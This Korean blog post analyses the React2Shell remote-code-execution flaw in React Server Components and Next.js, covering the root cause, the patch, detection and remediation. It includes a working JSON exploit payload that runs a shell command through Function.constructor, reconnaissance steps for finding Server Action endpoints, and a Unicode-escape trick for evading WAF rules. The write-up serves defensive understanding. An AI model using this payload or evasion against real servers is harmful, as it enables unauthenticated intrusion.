<h1>React2Shell (CVE-2025-55182) 뜯어보기</h1>
<p data-ke-size="size16">직접 공격을 당해보니 위험성을 더 잘 느낄 수 있었습니다.<br />이번 취약점 레벨은 <b>CVSS 10.0</b> 로 인증 없이 원격 코드 실행(RCE)이 가능했습니다.<br />(server-action 을 안썼다면 그나마 안전했을까요?)<br /><br /></p>
<p data-ke-size="size16">영향 범위는 React 19.x, Next.js 15.x 16.x 및 RSC 기반 프레임워크 입니다</p>
<p><del></del></p>
<p data-ke-size="size16">(와 14는 안전하다! 했으나... 후속 취약점 발견으로 그냥 다 업데이트 해야 했습니다)</p>
<hr data-ke-style="style1" />
<h2 data-ke-size="size26">1. 근본 원인?</h2>
<h3 data-ke-size="size23">1.1 왜 이런일이..</h3>
<p data-ke-size="size16">React Server Components의 <b>Flight Protocol 역직렬화 과정</b>에서 두 가지 결함이 결합되어 발생했습니다.</p>
<ol style="list-style-type: decimal;" data-ke-list-type="decimal">
<li><b>Prototype Pollution 미방어</b>: <code>hasOwnProperty</code> 검증 없이 객체 속성에 접근</li>
<li><b>Raw Chunk Reference</b>: Promise 객체 자체에 대한 참조를 허용</li>
</ol>
<h3 data-ke-size="size23">1.2 기술적 배경</h3>
<p data-ke-size="size16"><b>Flight Protocol이란?</b></p>
<p data-ke-size="size16">RSC는 서버에서 컴포넌트를 렌더링하고 그 결과를 클라이언트에 전달합니다.<br />이때 JSON으로는 표현할 수 없는 복잡한 타입(Promise, Blob, Map 등)을 처리하기 위해<br />독자적인 직렬화 포맷인 <b>Flight Protocol</b>을 사용합니다.</p>
<pre class="gams"><code>// Flight Protocol 표현식 예시
$@0  &rarr; Chunk 0에 대한 Promise 참조
$B0  &rarr; Blob 참조
$F0  &rarr; Server Function 참조</code></pre>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16"><b>Prototype Pollution이란?</b></p>
<p data-ke-size="size16">자바스크립트의 기본, 자바스크립트에서 객체는 prototype chain을 통해 부모 객체의 속성을 상속받습니다.<br />때문에 이를 악용하면 <code>__proto__</code>를 통해 모든 객체에 영향을 미치는 속성을 주입할 수 있습니다.<br /><code>hasOwnProperty</code> 만 있었어도..</p>
<pre class="javascript"><code>let obj1 = {};
console.log(obj1.foo); // undefined
<p>Object.prototype.foo = &quot;polluted&quot;;</p>
<p>let obj2 = {};
console.log(obj2.foo); // &quot;polluted&quot; (오염됨!)
console.log(obj2.hasOwnProperty(&quot;foo&quot;)); // false (자신의 속성이 아님)</code></pre></p>
<h3 data-ke-size="size23">1.3 취약점 발생 단계</h3>
<h4 data-ke-size="size20">Step 1: 취약한 코드의 위치</h4>
<p data-ke-size="size16"><code>ReactFlightReplyServer.js</code>의 <code>getOutlinedModel()</code> 함수:</p>
<pre class="xquery"><code>function getOutlinedModel(response, reference, parentObject, key, map) {
  const path = reference.split(':');
  const id = parseInt(path[0], 16);
  const chunk = getChunk(response, id);
<p>// ...상태 확인 로직...</p>
<p>switch (chunk.status) {
case INITIALIZED:
let value = chunk.value;
for (let i = 1; i &lt; path.length; i++) {
value = value[path[i]];  // ⚠️ hasOwnProperty 검증 없음!
}
return map(response, value);
}
}</code></pre></p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16"><code>path</code> 배열의 각 요소로 <code>value</code> 객체를 순회할 때 <code>hasOwnProperty</code> 검증이 없어 <code>__proto__</code> 접근이 가능합니다ㅜㅜ</p>
<h4 data-ke-size="size20">Step 2: Primitive 획득 과정</h4>
<p data-ke-size="size16"><b>Primitive #1 - Chunk.prototype 접근</b></p>
<pre class="reasonml"><code>// 공격자 입력
reference = "$1:__proto__:then"
<p>// 해석 과정
1번 Chunk의 <strong>proto</strong> (= Chunk.prototype)의 then 메서드 참조</code></pre></p>
<p data-ke-size="size16"><br /><code>$@0</code> 같은 표현은 Promise 객체 자체를 반환하므로, 이를 통해 <code>Chunk.prototype</code>에 접근할 수 있습니다.</p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16"><b>Primitive #2 - initializeModelChunk 호출 제어</b></p>
<p data-ke-size="size16"><code>Chunk.prototype.then</code>은 내부적으로 <code>initializeModelChunk()</code>를 호출합니다:</p>
<pre class="actionscript"><code>Chunk.prototype.then = function(resolve, reject) {
  const chunk = this;
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);  // &larr; 공격자가 제어 가능!
      break;
  }
  // ...
  switch (chunk.status) {
    case INITIALIZED:
      resolve(chunk.value);  // &larr; 여기서 악성 함수 실행
      break;
  }
};</code></pre>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16"><b>Primitive #3 - 임의 함수 생성 및 실행</b></p>
<p data-ke-size="size16"><code>parseModelString()</code>의 Blob 처리 로직을 악용:</p>
<pre class="arduino"><code>case 'B': {
  const id = parseInt(value.slice(2), 16);
  const blobKey = response._prefix + id;
  const backingEntry = response._formData.get(blobKey);  // &larr; 공격자 제어
  return backingEntry;
}</code></pre>
<p data-ke-size="size16"><br /><code>response._formData.get</code>을 <code>Function.constructor</code>로 설정하면 임의 함수 생성이 가능합니다.</p>
<h4 data-ke-size="size20">Step 3: 최종 공격 페이로드</h4>
<pre class="json"><code>{
  "then": "$1:__proto__:then",        // Chunk.prototype.then 참조
  "status": "resolved_model",
  "value": "{\"then\": \"$B1\"}",     // Blob을 통한 함수 생성
  "_response": {
    "_formData": {
      "get": "$1:constructor:constructor"  // Function.constructor
    },
    "_prefix": "process.mainModule.require('child_process').execSync('id');//"
  }
}</code></pre>
<h4 data-ke-size="size20">Step 4: 실행 흐름</h4>
<pre class="angelscript"><code>1. then이 Chunk.prototype.then으로 설정됨
2. 객체가 resolve될 때 then() 호출
3. this.status가 "resolved_model"이므로 initializeModelChunk() 호출
4. value 파싱 과정에서 $B1이 Function.constructor로 처리됨
5. _prefix에 담긴 악성 JavaScript 코드가 서버에서 실행됨!</code></pre>
<h3 data-ke-size="size23">1.4 패치 내용</h3>
<p data-ke-size="size16">커밋 <code>7dc903c</code>에서 <code>hasOwnProperty</code> 검증이 추가됨</p>
<pre class="reasonml"><code>// 패치 후
for (let i = 1; i &lt; path.length; i++) {
  if (!value.hasOwnProperty(path[i])) {
    // __proto__ 등 prototype chain 접근 차단
    throw new Error('Invalid property access');
  }
  value = value[path[i]];
}</code></pre>
<hr data-ke-style="style1" />
<h2 data-ke-size="size26">2. 실무자가 확인할 수 있는 RSC 노출 정보</h2>
<p data-ke-size="size16">악성 사용자가 <b>정찰</b> 단계에서 수집할 수 있는 정보는 다음과 같았습니다.</p>
<h3 data-ke-size="size23">2.1 HTML에 노출되는 Server Action ID</h3>
<p data-ke-size="size16">브라우저 개발자 도구에서 페이지 소스를 확인하면 Server Action의 ID가 노출됩니다:</p>
<pre class="xml"><code>&lt;!-- 페이지 소스 예시 --&gt;
&lt;script&gt;
  self.__next_f.push([1, "1:\"$ACTION_ID_abc123def456\"\n"])
&lt;/script&gt;
<p>&lt;!-- 또는 form의 hidden input으로 --&gt;
&lt;form action=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;$ACTION_REF_ID&quot; value=&quot;abc123def456&quot; /&gt;
&lt;/form&gt;</code></pre></p>
<p data-ke-size="size16">&nbsp;</p>
<p data-ke-size="size16"><b>확인 방법:</b></p>
<ol style="list-style-type: decimal;" data-ke-list-type="decimal">
<li>개발자 도구 &rarr; Network 탭</li>
<li>RSC 요청 확인(<code>?_rsc=</code> 파라미터가 붙은 요청) &lt; 이라고 하지만 그냥 Doc 탭의 요청 내역에서 Response 보면 됨</li>
<li>Response에서 <code>$ACTION_ID</code> 또는 <code>$F</code> 패턴 검색</li>
</ol>
<h3 data-ke-size="size23">2.2 Next-Action 헤더</h3>
<p data-ke-size="size16">Server Action 호출 시 <code>Next-Action</code> 헤더가 전송됩니다:</p>
<pre class="http"><code>POST /api/action HTTP/1.1
Host: example.com
Content-Type: multipart/form-data
Next-Action: abc123def456789</code></pre>
<p data-ke-size="size16"><b>확인 방법:</b></p>
<pre class="javascript"><code>// 브라우저 콘솔에서 실행
const observer = new PerformanceObserver((list) =&gt; {
  for (const entry of list.getEntries()) {
    if (entry.name.includes('_rsc')) {
      console.log('RSC Request:', entry.name);
    }
  }
});
observer.observe({ entryTypes: ['resource'] });</code></pre>
<h3 data-ke-size="size23">2.3 Flight Protocol 페이로드 구조</h3>
<p data-ke-size="size16">Network 탭에서 RSC 응답을 확인하면 Flight Protocol 형식을 볼 수 있습니다:</p>
<pre class="dart"><code>0:["$","div",null,{"children":"Hello"}]
1:["$","$L2",null,{}]
2:I["@/components/Button","default"]</code></pre>
<p data-ke-size="size16"><b>주요 패턴:</b></p>
<ul style="list-style-type: disc;" data-ke-list-type="disc">
<li><code>$L</code> : Lazy 컴포넌트 참조</li>
<li><code>$F</code> : Server Function 참조</li>
<li><code>$@</code> : Promise/Chunk 참조</li>
<li><code>I[...]</code> : Import 구문</li>
</ul>
<h3 data-ke-size="size23">2.4 RSC 엔드포인트 식별</h3>
<pre class="routeros"><code># RSC 엔드포인트 패턴
GET /?_rsc=xxxxx HTTP/1.1
POST / HTTP/1.1  (with Next-Action header)
<h1>curl로 확인</h1>
<p>curl -I &quot;https://target.com/?_rsc=test&quot; <br>
-H &quot;RSC: 1&quot; <br>
-H &quot;Next-Router-State-Tree: ...&quot;</code></pre></p>
<h3 data-ke-size="size23">2.5 버전 정보 노출</h3>
<p data-ke-size="size16">브라우저 콘솔에서 Next.js 버전 확인:</p>
<pre class="awk"><code>// 브라우저 콘솔
next.version  // 예: "15.3.4"</code></pre>
<p data-ke-size="size16"><br />또는 <code>/_next/static/chunks/</code> 경로의 파일명에서 버전 힌트를 얻을 수 있습니다.</p>
<h3 data-ke-size="size23">2.6 자체 점검 해보기</h3>
<pre class="routeros"><code>□ package.json에서 next, react-server-dom-* 버전 확인
□ 빌드 결과물에서 Server Action ID 노출 여부 확인
□ Network 탭에서 Flight Protocol 요청/응답 모니터링
□ 에러 메시지에서 내부 경로 노출 여부 확인
□ Source Map 비활성화 여부 확인 (프로덕션)</code></pre>
<hr data-ke-style="style1" />
<h2 data-ke-size="size26">3. 대처 방안</h2>
<h3 data-ke-size="size23">3.1 즉각적인 패치</h3>
<p data-ke-size="size16"><b>패치 적용이 유일한 해결책이었습니다...!!</b></p>
<p data-ke-size="size16"><b>자동 업그레이드 도구가 있긴합니다</b></p>
<pre class="vim"><code>npx fix-react2shell-next</code></pre>
<h3 data-ke-size="size23">3.2 WAF로 방어할 수 없는 이유</h3>
<p data-ke-size="size16">WAF(Web Application Firewall) 규칙은 <b>완전한 방어가 불가능</b>합니다:</p>
<pre class="taggerscript"><code>// Flight Protocol은 JSON.parse를 사용하므로 유니코드 우회 가능
{
  "\u0074\u0068\u0065\u006e": "\u0024\u0031\u003a..."
}
// 위 코드는 "then": "$1:..."과 동일</code></pre>
<p data-ke-size="size16"><br />Vercel은 WAF 규칙을 배포했지만, 이는 추가적인 방어층일 뿐 패치를 대체하지 못합니다.</p>
<h3 data-ke-size="size23">3.4 침해 여부 점검</h3>
<p data-ke-size="size16"><b>12월 4일 이전에 취약한 버전으로 운영했다면 침해를 가정하고 대응하는 편이 좋았습니다</b></p>
<pre class="fortran"><code>점검 항목:
□ 비정상적인 POST 요청 로그 확인 (특히 multipart/form-data)
□ 서버 함수 타임아웃 급증 여부
□ 예기치 않은 프로세스 생성 로그
□ 아웃바운드 네트워크 연결 이상 여부</code></pre>
<h3 data-ke-size="size23">3.5 시크릿 로테이션</h3>
<p data-ke-size="size16">침해 가능성이 있다면 모든 시크릿을 교체해야 합니다:</p>
<h3 data-ke-size="size23">3.6 영향받지 않는 경우</h3>
<p data-ke-size="size16">다음 조건에 해당하면 이 취약점의 영향을 받지 <b>않습니다</b>:</p>
<ul style="list-style-type: disc;" data-ke-list-type="disc">
<li>React 코드가 서버에서 실행되지 않는 경우 (순수 CSR)</li>
<li>React Server Components를 지원하지 않는 번들러/프레임워크 사용</li>
<li><del>Next.js 14.2.x 이하 안정 버전 사용 (14.3.0-canary.77 미만)</del> &lt; 후속 취약점으로 인해 모두 영향받음</li>
</ul>
<hr data-ke-style="style1" />
<h2 data-ke-size="size26">참고 자료</h2>
<ul style="list-style-type: disc;" data-ke-list-type="disc">
<li><a href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components">React 공식 보안 공지</a></li>
<li><a href="https://vercel.com/kb/bulletin/react2shell">Vercel Security Bulletin</a></li>
<li><a href="https://www.enki.co.kr/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability">ENKI 한국어 분석</a></li>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp">Next.js CVE-2025-66478</a></li>
<li><a href="https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700">React 패치 커밋</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-55182">CVE-2025-55182 상세</a></li>
</ul>